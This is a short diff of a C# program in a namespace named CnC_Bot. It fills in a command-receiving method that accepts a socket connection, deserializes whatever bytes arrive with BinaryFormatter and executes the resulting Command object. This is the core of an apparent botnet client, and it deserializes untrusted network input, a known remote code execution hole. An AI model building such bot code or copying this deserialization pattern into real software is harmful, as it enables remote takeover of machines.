@@ -1,8 +1,11 @@
-﻿using System;
+﻿using Common.Commands;
+using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -86,7 +89,27 @@ namespace CnC_Bot
 
         private void Recv_Command()
         {
-            throw new NotImplementedException();
+            try
+            {
+                /* Get a new connection from the server */
+                Socket serverCommandSocket = CommandsSocket.Accept();
+
+                byte[] commandData = new byte[2048];
+                serverCommandSocket.Receive(commandData);
+
+                BinaryFormatter formattor = new BinaryFormatter();
+                MemoryStream ms = new MemoryStream(commandData);
+
+                /* Retrieve the command object, execute it and return the result to the server */
+                Command currentCommand = (Command)formattor.Deserialize(ms);
+                currentCommand.Execute(serverCommandSocket);
+
+                serverCommandSocket.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error while getting and parsing new command.\n{0}", ex.ToString());
+            }
         }
     }
 }
